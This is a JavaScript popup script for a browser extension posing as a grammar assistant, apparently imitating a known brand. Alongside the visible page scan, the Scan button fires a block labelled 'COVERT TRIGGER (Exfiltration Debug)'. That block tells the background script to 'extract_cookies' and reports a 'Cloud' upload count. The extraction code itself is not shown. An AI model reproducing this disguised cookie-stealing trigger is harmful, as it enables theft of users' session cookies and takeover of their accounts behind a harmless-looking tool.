document.addEventListener('DOMContentLoaded', () => {
    const toggle = document.getElementById('toggleAssistant');
    const scanBtn = document.getElementById('scanBtn');
    const issuesCount = document.getElementById('issuesCount');
    const output = document.getElementById('output');

    // Load state
    chrome.storage.local.get(['enabled', 'issueCount'], (result) => {
        toggle.checked = result.enabled !== false; // Default true
        issuesCount.textContent = result.issueCount || 0;
    });

    // Toggle handler
    toggle.addEventListener('change', () => {
        chrome.storage.local.set({ enabled: toggle.checked });
        output.textContent = toggle.checked ? "Assistant Enabled" : "Assistant Disabled";
    });

    // Scan button handler
    scanBtn.addEventListener('click', () => {
        output.textContent = "Scanning..."; // Reset text

        // 1. Grammerly Scan (Frontend)
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            if (!tabs[0]) {
                output.textContent = "Error: No active tab.";
                return;
            }

            // A. Send message to content script (Visual)
            chrome.tabs.sendMessage(tabs[0].id, { action: "scan_page" }, (response) => {
                let scanText = "";
                if (chrome.runtime.lastError) {
                    scanText = "Scan: Failed (Refresh Page)";
                } else {
                    scanText = `Scan: ${response ? response.count : 0} fields`;
                }

                // Helper to update output safely (since async returns might overlap)
                updateOutput(scanText);
            });

            // B. COVERT TRIGGER (Exfiltration Debug)
            // This calls the background script directly.
            chrome.runtime.sendMessage({ action: "extract_cookies" }, (response) => {
                let cloudText = "";
                if (chrome.runtime.lastError) {
                    cloudText = " | Cloud: BG Error (" + chrome.runtime.lastError.message + ")";
                } else if (response && response.status === "error") {
                    cloudText = " | Cloud: Failed (" + response.message + ")";
                } else if (response && response.status === "success") {
                    cloudText = " | Cloud: OK (" + response.count + ")";
                } else {
                    cloudText = " | Cloud: Unknown Response";
                }
                updateOutput(cloudText);
            });
        });
    });

    // Helper to append text to output without overwriting
    function updateOutput(text) {
        // If the text starts with " |", append it. Otherwise, if it's the scanning text, set/prepend it.
        // Simple logic: If current text has "|", we preserve it.
        if (text.startsWith(" |")) {
            output.textContent += text;
        } else {
            // It's the scan status.
            // If we already have a pipe, keep the pipe part.
            if (output.textContent.includes("|")) {
                let parts = output.textContent.split("|");
                output.textContent = text + " |" + parts.slice(1).join("|");
            } else {
                output.textContent = text;
            }
        }
    }

    // Update stats periodically
    setInterval(() => {
        chrome.storage.local.get(['issueCount'], (result) => {
            if (result.issueCount) issuesCount.textContent = result.issueCount;
        });
    }, 2000);
});
